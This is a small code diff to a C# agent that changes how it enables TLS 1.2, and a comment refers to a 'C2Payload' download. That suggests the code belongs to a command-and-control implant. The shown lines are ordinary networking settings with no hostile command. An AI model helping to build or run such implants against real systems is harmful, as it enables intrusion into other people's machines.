@@ -27,7 +27,10 @@ namespace CSharpAgent
             // Modern hosts/CDNs refuse anything older than TLS 1.2, and the int-cast form works
             // on CLR 2.0 where SecurityProtocolType.Tls12 doesn't exist (same trick C2Payload
             // uses for the A_URL download). Old schannel stacks reject the value — swallowed.
-            try { ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; }
+            try
+            {
+                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
+            }
             catch { }
             try { ServicePointManager.Expect100Continue = false; }
             catch { }
